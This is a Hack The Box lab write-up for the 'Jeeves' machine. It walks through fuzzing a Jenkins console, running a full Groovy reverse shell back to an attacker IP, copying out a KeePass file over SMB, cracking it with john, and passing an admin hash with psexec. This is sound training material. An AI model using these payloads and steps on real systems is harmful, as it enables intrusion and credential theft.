---
layout: post
title: HTB Machine - Jeeves
subtitle: Writeup
cover-img: https://www.hackthebox.com/storage/avatars/709059a710d3d6ff1ba32bf0729ecbb8.png
thumbnail-img: https://www.hackthebox.com/storage/avatars/709059a710d3d6ff1ba32bf0729ecbb8.png
share-img: https://www.hackthebox.com/storage/avatars/709059a710d3d6ff1ba32bf0729ecbb8.png
tags: [ HTB, Hack the Box,Web Forensics,Vulnerability Assessment,Security Tools,Authentication,Weak Credentials,Remote Code Execution,Powershell]
---
scans:
```zsh
TTL :windows.

sudo nmap -sS 10.10.10.63 --open --min-rate 5000 -n -Pn -oG ./nmap/allports

sudo nmap -sCV 10.10.10.63 -p80,135,445,50000 -oN ./nmap/targeted
```

Website is static. On port 50000 there is no other than a redirect to another website. We will try fuzing the website then. 

```zsh
ffuf -c -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.63:50000/FUZZ -ic
askjeeves              
```
We get access to a jenkins manager website. By going to manage jenkins-script console we could execute groovy scripts. Simply searching groovy reverse shell script we come accross a reverse shell generator. 

https://www.revshells.com/

Enter your ip, port and copy the command with rlwrap+nc (that way we have interactive console capabilities). Execute it in your attackers terminal.
```zsh
rlwrap -cAr nc -lvnp 8044
```

under the reverse tab select groovy (bottom of the list), shell:cmd and encoding:none. Input the script inside the script console in the manage jenkins website and run it to get a console inside the target machine. 
```zsh
String host="10.10.14.5";int port=8044;String cmd="cmd";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Once in we can go for the user flag
```zsh
more c:\Users\kohsuke\Desktop\user.txt
```

Doing some recon in the documents folder of the user we notice a .kdbx file. Kdbx is the data files created by KeePass Password Safe are and they usually refer to the KeePass Password Database. These files contain passwords in an encrypted database wherein they can only be viewed if the user set a master password and accessed them through that master password. Interesting indeed so lets download it to our attack machine by setting up a smbfolder to upload the file to.  
```
sudo impacket-smbserver smbFolder $(pwd) -smb2support

copy CEH.kdbx \\10.10.14.5\smbFolder\CEH.kdbx
```
To open the file we will need a tool for it. 
```
sudo apt install keepassxc
keepassxc CEH.kdbx
```
It is asking for a password that we dont have, trying the usual passwords does not bring any results. But we can try to crack the pass with john. First we will use keepass2john to generate a hash. Then we use john to crack the pass from the hash.
```zsh
keepass2john CEH.kdbx > hash

john -wordlist=/usr/share/wordlists/rockyou.txt hash
moonshine1
```
Now we have the password we can examine the password database. There are several interesting entries, but if we check 'backup stuff' password we see an interesting format. It looks more like a hash. Lets validate if thats the hash for the admin password with crackmapexec. 
```zsh
cme smb 10.10.10.63 -u "Administrator" -H "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00"
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```
Then we will gain root passing the hash with psexec.
```powershell
psexec.py WORKGROUP/Administrator@10.10.10.63 -hashes ':e0fb1fb85756c24235ff238cbe81fe00'

C:\Windows\system32> whoami
nt authority\system
```
If we read the file present in the admin desktop folder the message says the flag is somewhere else. 
```powershell
c:\Users\Administrator\Desktop> more hm.txt
The flag is elsewhere.  Look deeper.
```
Going around the file system brings no fruits, so we can look into alternate data strings. An Alternate Data Stream is a little-known feature of the NTFS file system. It has the ability of forking data into an existing file without changing its file size or functionality. Think of ADS as a 'file inside another file'. With that knowledge and looking into the Desktop folder we find out our flag is present.
```powershell
dir /s /r

more < hm.txt:root.txt
```
